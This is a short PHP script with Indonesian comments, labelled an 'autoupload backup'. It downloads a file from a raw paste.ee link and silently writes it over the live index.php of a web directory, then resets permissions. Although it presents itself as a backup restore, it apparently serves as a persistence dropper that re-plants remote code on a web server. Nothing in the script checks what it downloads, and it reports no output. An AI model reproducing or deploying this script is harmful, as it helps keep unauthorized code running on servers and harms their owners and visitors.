<?php
// autoupload backup, rahmanralei
$backupURLs = array(
        '/var/www/btscloud/' => array(
        'index.php' => 'https://paste.ee/r/UbEMI72b/0'
    )
);

// Fungsi untuk memastikan permission file/direktori sesuai dengan standar
function setProperPermissions($path) {
    if (is_dir($path)) {
        $expectedPermission = '0755';
    } elseif (is_file($path)) {
        $expectedPermission = '0644';
    } else {
        return; // Skip jika bukan file atau direktori
    }

    // Mendapatkan permission saat ini dalam format oktal
    $currentPermission = substr(sprintf('%o', fileperms($path)), -4);

    // Ubah permission jika tidak sesuai
    if ($currentPermission !== $expectedPermission) {
        chmod($path, octdec($expectedPermission));
    }
}

foreach ($backupURLs as $directoryPath => $files) {
    // Mengecek apakah direktori tujuan ada, jika tidak, maka membuatnya
    if (!is_dir($directoryPath)) {
        mkdir($directoryPath, 0755, true);
    }

    // Periksa permission direktori
    setProperPermissions($directoryPath);

    // Ambil isi direktori dan cek permission setiap file
    $dirContents = array_diff(scandir($directoryPath), array('..', '.'));
    foreach ($dirContents as $file) {
        $filePath = $directoryPath . $file;
        
        if (is_file($filePath)) {
            setProperPermissions($filePath);
        }
    }

    // Unduh setiap file dari URL yang ditentukan
    foreach ($files as $fileName => $backupURL) {
        $filePath = $directoryPath . $fileName;
        $ch = curl_init($backupURL);
        $fp = fopen($filePath, 'w');

        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);

        if (curl_exec($ch)) {
            // echo "$fileName berhasil diunduh.";
        } else {
            // echo "$fileName gagal diunduh.";
        }

        curl_close($ch);
        fclose($fp);

        // Pastikan file memiliki permission 0644
        setProperPermissions($filePath);
    }
}
?>
